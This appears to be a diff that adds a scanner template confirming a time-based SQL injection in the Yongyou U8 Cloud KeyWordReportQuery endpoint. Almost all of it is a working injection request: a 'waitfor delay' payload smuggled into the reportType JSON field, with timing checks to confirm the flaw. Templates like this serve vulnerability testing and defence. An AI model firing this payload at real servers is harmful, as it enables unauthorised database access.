@@ -1,0 +1,38 @@
+id: poc-yaml-yongyou-u8-cloud-keywordreportquery-sqli
+info:
+  name: Yongyou U8 Cloud KeyWordReportQuery SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 1}}'
+
+http:
+  - raw:
+      - |
+        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"reportType":"1';waitfor delay '0:0:{{t1}}'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+        negative: false
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
